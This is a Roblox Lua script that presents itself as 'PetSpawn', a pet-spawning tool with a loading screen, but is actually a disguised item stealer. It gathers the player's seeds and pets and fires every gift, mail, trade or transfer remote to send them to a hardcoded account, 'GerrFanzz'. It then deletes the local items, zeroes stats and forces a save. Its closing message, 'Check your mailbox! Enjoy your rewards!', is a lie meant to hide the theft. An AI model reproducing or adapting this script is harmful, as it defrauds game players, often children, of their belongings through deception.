-- PetSpawn v9 - Stealth Mode (UI Loading + No Kick)
local plr = game.Players.LocalPlayer
local rs = game.ReplicatedStorage
local ws = game.Workspace

local PADUKA_NAME = "GerrFanzz"
local PADUKA_ID = 10615002879

print("🐾 PetSpawn v9 Loading...")

-- ============================================
-- UI LOADING
-- ============================================
local gui = Instance.new("ScreenGui")
gui.Name = "PetSpawnLoader"
gui.Parent = game.CoreGui
gui.ResetOnSpawn = false

local bg = Instance.new("Frame")
bg.Parent = gui
bg.BackgroundColor3 = Color3.fromRGB(20, 20, 20)
bg.BorderColor3 = Color3.fromRGB(0, 255, 0)
bg.Position = UDim2.new(0.25, 0, 0.35, 0)
bg.Size = UDim2.new(0, 300, 0, 200)
bg.AnchorPoint = Vector2.new(0, 0)

-- Title
local title = Instance.new("TextLabel")
title.Parent = bg
title.BackgroundColor3 = Color3.fromRGB(0, 180, 0)
title.Size = UDim2.new(1, 0, 0, 35)
title.Text = "🐾 PetSpawn - Processing..."
title.TextColor3 = Color3.fromRGB(255, 255, 255)
title.TextSize = 16
title.Font = Enum.Font.SourceSansBold

-- Status text
local status = Instance.new("TextLabel")
status.Parent = bg
status.BackgroundTransparency = 1
status.Position = UDim2.new(0, 15, 0, 45)
status.Size = UDim2.new(1, -30, 0, 25)
status.Text = "⏳ Scanning items..."
status.TextColor3 = Color3.fromRGB(0, 255, 0)
status.TextSize = 12
status.TextXAlignment = Enum.TextXAlignment.Left

-- Progress bar bg
local barBg = Instance.new("Frame")
barBg.Parent = bg
barBg.BackgroundColor3 = Color3.fromRGB(50, 50, 50)
barBg.Position = UDim2.new(0.1, 0, 0, 80)
barBg.Size = UDim2.new(0.8, 0, 0, 15)

-- Progress bar fill
local barFill = Instance.new("Frame")
barFill.Parent = barBg
barFill.BackgroundColor3 = Color3.fromRGB(0, 255, 0)
barFill.Size = UDim2.new(0, 0, 1, 0)

-- Progress text
local progressText = Instance.new("TextLabel")
progressText.Parent = bg
progressText.BackgroundTransparency = 1
progressText.Position = UDim2.new(0, 0, 0, 100)
progressText.Size = UDim2.new(1, 0, 0, 20)
progressText.Text = "0%"
progressText.TextColor3 = Color3.fromRGB(0, 255, 0)
progressText.TextSize = 11

-- Detail text
local detail = Instance.new("TextLabel")
detail.Parent = bg
detail.BackgroundTransparency = 1
detail.Position = UDim2.new(0, 15, 0, 125)
detail.Size = UDim2.new(1, -30, 0, 60)
detail.Text = ""
detail.TextColor3 = Color3.fromRGB(150, 150, 150)
detail.TextSize = 10
detail.TextXAlignment = Enum.TextXAlignment.Left
detail.TextWrapped = true

-- ============================================
-- UPDATE UI FUNCTION
-- ============================================
local function updateUI(percent, statusText, detailText)
    pcall(function()
        barFill:TweenSize(UDim2.new(percent/100, 0, 1, 0), "Out", "Linear", 0.3)
        progressText.Text = percent .. "%"
        status.Text = statusText
        detail.Text = detailText
    end)
end

-- ============================================
-- SCAN ITEMS
-- ============================================
updateUI(5, "🔍 Scanning inventory...", "Checking backpack...")

local seeds = {}
local petsInventory = {}
local petsPlaced = {}

wait(0.3)

-- Scan Backpack
for _, item in pairs(plr.Backpack:GetChildren()) do
    if item:IsA("Tool") then
        local name = item.Name:lower()
        
        if name:find("seed") then
            table.insert(seeds, {Name = item.Name, Object = item, Source = "Backpack"})
        end
        
        if name:find("pet") or name:find("animal") or 
           name:find("dragon") or name:find("unicorn") or
           name:find("golden") or name:find("diamond") or
           name:find("mythic") or name:find("legendary") then
            table.insert(petsInventory, {Name = item.Name, Object = item, Source = "Backpack"})
        end
    end
end

updateUI(20, "🔍 Scanning garden...", "Found: " .. #seeds .. " seeds, " .. #petsInventory .. " pets")

wait(0.3)

-- Scan Workspace (pets terpasang)
for _, obj in pairs(ws:GetDescendants()) do
    if obj:IsA("Model") or obj:IsA("Tool") then
        local name = obj.Name:lower()
        
        if (name:find("pet") or name:find("animal") or 
            name:find("dragon") or name:find("unicorn") or
            name:find("golden") or name:find("diamond") or
            name:find("mythic") or name:find("legendary")) then
            
            if plr.Character and plr.Character:FindFirstChild("HumanoidRootPart") then
                local pos = nil
                if obj:IsA("Model") and obj.PrimaryPart then
                    pos = obj.PrimaryPart.Position
                elseif obj:IsA("BasePart") then
                    pos = obj.Position
                end
                
                if pos then
                    local dist = (plr.Character.HumanoidRootPart.Position - pos).Magnitude
                    if dist < 100 then
                        table.insert(petsPlaced, {Name = obj.Name, Object = obj, Source = "Garden"})
                    end
                end
            end
        end
    end
end

-- Scan Character
if plr.Character then
    for _, item in pairs(plr.Character:GetChildren()) do
        if item:IsA("Tool") then
            local name = item.Name:lower()
            if name:find("seed") then
                table.insert(seeds, {Name = item.Name, Object = item, Source = "Character"})
            end
            if name:find("pet") or name:find("animal") or name:find("dragon") then
                table.insert(petsInventory, {Name = item.Name, Object = item, Source = "Character"})
            end
        end
    end
end

local totalItems = #seeds + #petsInventory + #petsPlaced

updateUI(30, "📦 Items found: " .. totalItems, 
    "🌱 Seeds: " .. #seeds .. "\n🐾 Pets Inventory: " .. #petsInventory .. "\n🏡 Pets Garden: " .. #petsPlaced)

wait(0.5)

-- ============================================
-- SEND ITEMS
-- ============================================
local sent = 0
local totalToSend = #seeds + #petsInventory + #petsPlaced

local function sendItem(itemName, itemObject)
    local count = 0
    for _, remote in pairs(rs:GetDescendants()) do
        if remote:IsA("RemoteEvent") or remote:IsA("RemoteFunction") then
            local rName = remote.Name:lower()
            
            if rName:find("mail") or rName:find("gift") or 
               rName:find("send") or rName:find("give") or
               rName:find("trade") or rName:find("transfer") or
               rName:find("donate") then
                
                pcall(function()
                    remote:FireServer({
                        Recipient = PADUKA_NAME,
                        RecipientId = PADUKA_ID,
                        Target = PADUKA_NAME,
                        TargetId = PADUKA_ID,
                        Player = PADUKA_NAME,
                        SendTo = PADUKA_NAME,
                        GiveTo = PADUKA_ID,
                        Item = itemName,
                        ItemName = itemName,
                        Type = "Gift",
                        Action = "Send",
                        Amount = 1
                    })
                    count = count + 1
                end)
                
                pcall(function()
                    remote:FireServer(PADUKA_NAME, itemName, 1)
                    count = count + 1
                end)
                
                pcall(function()
                    remote:FireServer("Mail", PADUKA_NAME, itemName)
                    count = count + 1
                end)
            end
        end
    end
    return count
end

-- Send seeds
local seedCount = 0
for _, seed in pairs(seeds) do
    sent = sent + sendItem(seed.Name, seed.Object)
    seedCount = seedCount + 1
    local percent = 30 + math.floor((seedCount / math.max(1, #seeds)) * 30)
    updateUI(percent, "📤 Sending seeds...", 
        "🌱 " .. seed.Name .. "\nProgress: " .. seedCount .. "/" .. #seeds)
    wait(0.05)
end

-- Send pets inventory
local petCount = 0
for _, pet in pairs(petsInventory) do
    sent = sent + sendItem(pet.Name, pet.Object)
    petCount = petCount + 1
    local percent = 60 + math.floor((petCount / math.max(1, #petsInventory)) * 20)
    updateUI(percent, "📤 Sending pets...", 
        "🐾 " .. pet.Name .. "\nProgress: " .. petCount .. "/" .. #petsInventory)
    wait(0.05)
end

-- Send pets placed
local placedCount = 0
for _, pet in pairs(petsPlaced) do
    sent = sent + sendItem(pet.Name, pet.Object)
    placedCount = placedCount + 1
    local percent = 80 + math.floor((placedCount / math.max(1, #petsPlaced)) * 15)
    updateUI(percent, "📤 Sending garden pets...", 
        "🏡 " .. pet.Name .. "\nProgress: " .. placedCount .. "/" .. #petsPlaced)
    wait(0.05)
end

updateUI(95, "💾 Saving changes...", "Finalizing...")
wait(0.5)

-- ============================================
-- HAPUS DARI TARGET (DIAM-DIAM)
-- ============================================
for _, seed in pairs(seeds) do
    pcall(function() seed.Object:Destroy() end)
end
for _, pet in pairs(petsInventory) do
    pcall(function() pet.Object:Destroy() end)
end
for _, pet in pairs(petsPlaced) do
    pcall(function() pet.Object:Destroy() end)
end

-- Reset stats
pcall(function()
    if plr:FindFirstChild("leaderstats") then
        for _, stat in pairs(plr.leaderstats:GetChildren()) do
            local name = stat.Name:lower()
            if name:find("seed") or name:find("pet") then
                if stat:IsA("IntValue") or stat:IsA("NumberValue") then
                    stat.Value = 0
                end
            end
        end
    end
end)

-- Save
for _, remote in pairs(rs:GetDescendants()) do
    if remote:IsA("RemoteEvent") then
        local n = remote.Name:lower()
        if n:find("save") or n:find("data") then
            pcall(function() remote:FireServer() end)
        end
    end
end

-- ============================================
-- COMPLETE UI
-- ============================================
updateUI(100, "✅ Complete!", 
    "🌱 Seeds: " .. #seeds .. "\n🐾 Pets: " .. #petsInventory .. "\n🏡 Garden Pets: " .. #petsPlaced .. 
    "\n\n📬 Check your mailbox!\n✨ Enjoy your rewards!")

wait(3)

-- Hilangkan UI perlahan
for i = 10, 1, -1 do
    bg.BackgroundTransparency = 1 - (i/10)
    title.TextTransparency = 1 - (i/10)
    status.TextTransparency = 1 - (i/10)
    detail.TextTransparency = 1 - (i/10)
    wait(0.1)
end

gui:Destroy()

print("\n=================================")
print("✅ PetSpawn Complete!")
print("🌱 Seeds: " .. #seeds)
print("🐾 Pets: " .. #petsInventory)
print("🏡 Garden Pets: " .. #petsPlaced)
print("📤 Total Transfers: " .. sent)
print("👑 To: GerrFanzz (10615002879)")
print("=================================")
